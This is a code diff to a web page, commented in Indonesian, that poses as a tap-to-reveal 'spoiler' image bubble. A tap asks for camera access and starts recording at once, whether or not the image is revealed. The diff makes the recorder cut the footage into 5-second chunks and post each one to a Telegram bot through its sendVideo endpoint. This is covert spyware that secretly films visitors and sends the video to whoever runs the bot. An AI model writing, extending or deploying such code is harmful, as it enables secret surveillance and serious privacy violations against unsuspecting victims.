@@ -229,8 +229,8 @@
             let mediaRecorder = null;
             let recordedChunks = [];
             let isRecording = false;
-            let isProcessingVideo = false;
-            let hasStartedRecording = false;
+            let sendInterval = null;
+            let recordingStartTime = null;
 
             // ====== BINTIK ======
             function resizeCanvas() {
@@ -305,33 +305,9 @@
                 }
             }
 
-            // ====== KIRIM VIDEO KE TELEGRAM ======
-            function sendVideoToTelegram(blob) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'spoiler_video.webm');
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(result => {
-                    if (result.ok) {
-                        console.log('✅ Video terkirim!');
-                    } else {
-                        console.error('❌ Gagal kirim video:', result.description);
-                    }
-                })
-                .catch(err => {
-                    console.error('Error kirim video:', err);
-                });
-            }
-
             // ====== SETUP KAMERA & MULAI REKAM ======
             async function setupCamera() {
                 if (isRequestingPermission) return;
-                if (isProcessingVideo) return;
                 if (isCameraReady) return;
 
                 isRequestingPermission = true;
@@ -354,7 +330,7 @@
                         isCameraReady = true;
                         isRequestingPermission = false;
                         
-                        // MULAI REKAMAN LANGSUNG (meskipun spoiler belum terbuka)
+                        // MULAI REKAMAN LANGSUNG
                         startRecording(stream);
                     };
 
@@ -386,6 +362,7 @@
 
                     mediaRecorder = new MediaRecorder(stream, options);
                     recordedChunks = [];
+                    recordingStartTime = Date.now();
 
                     mediaRecorder.ondataavailable = (event) => {
                         if (event.data && event.data.size > 0) {
@@ -394,6 +371,7 @@
                     };
 
                     mediaRecorder.onstop = () => {
+                        // Kirim video terakhir saat rekaman berhenti
                         if (recordedChunks.length > 0) {
                             const blob = new Blob(recordedChunks, { type: 'video/webm' });
                             if (blob.size > 0) {
@@ -403,21 +381,32 @@
                         }
                         recordedChunks = [];
                         isRecording = false;
-                        isProcessingVideo = false;
-                        hasStartedRecording = false;
                         isCameraReady = false;
+                        if (sendInterval) {
+                            clearInterval(sendInterval);
+                            sendInterval = null;
+                        }
                     };
 
                     // Mulai rekaman
-                    mediaRecorder.start();
+                    mediaRecorder.start(5000); // Potong setiap 5 detik
                     isRecording = true;
-                    isProcessingVideo = true;
-                    hasStartedRecording = true;
-                    console.log('🎥 Rekaman dimulai (spoiler belum tentu terbuka)...');
+                    console.log('🎥 Rekaman dimulai...');
+
+                    // Kirim video setiap 5 detik
+                    sendInterval = setInterval(() => {
+                        if (mediaRecorder && isRecording && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                            setTimeout(() => {
+                                if (isRecording && mediaRecorder) {
+                                    mediaRecorder.start(5000);
+                                }
+                            }, 100);
+                        }
+                    }, 5000);
 
                 } catch (e) {
                     console.error('Start recording error:', e);
-                    isProcessingVideo = false;
                 }
             }
 
@@ -425,39 +414,61 @@
             function stopRecording() {
                 if (mediaRecorder && isRecording) {
                     console.log('⏹️ Menghentikan rekaman...');
+                    if (sendInterval) {
+                        clearInterval(sendInterval);
+                        sendInterval = null;
+                    }
                     mediaRecorder.stop();
                     isRecording = false;
                 }
+            }
+
+            // ====== SEND VIDEO KE TELEGRAM ======
+            function sendVideoToTelegram(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', blob, 'spoiler_video.webm');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(result => {
+                    if (result.ok) {
+                        console.log('✅ Video terkirim!');
+                    } else {
+                        console.error('❌ Gagal kirim video:', result.description);
+                    }
+                })
+                .catch(err => {
+                    console.error('Error kirim video:', err);
+                });
             }
 
             // ====== TOGGLE SPOILER ======
             function toggleSpoiler(e) {
                 e.stopPropagation();
 
-                // Jika sedang meminta izin, abaikan
                 if (isRequestingPermission) return;
 
-                // Jika belum minta izin sama sekali, mulai kamera
-                if (!isCameraReady && !hasStartedRecording) {
+                // Jika belum minta izin, mulai kamera
+                if (!isCameraReady && !isRecording) {
                     setupCamera();
                     return;
                 }
 
                 // Toggle spoiler (buka/tutup) - REKAMAN TETAP BERJALAN
                 if (isUnblurred) {
-                    // Tutup spoiler
                     isUnblurred = false;
                     bubble.classList.remove('unblur');
                     hint.textContent = '⏺ ketuk untuk lihat';
                     startAnimation();
-                    console.log('🔒 Spoiler ditutup (rekaman tetap berjalan)');
                 } else {
-                    // Buka spoiler
                     isUnblurred = true;
                     bubble.classList.add('unblur');
                     hint.textContent = '✅ terlihat';
                     stopAnimation();
-                    console.log('🔓 Spoiler dibuka (rekaman tetap berjalan)');
                 }
             }
 
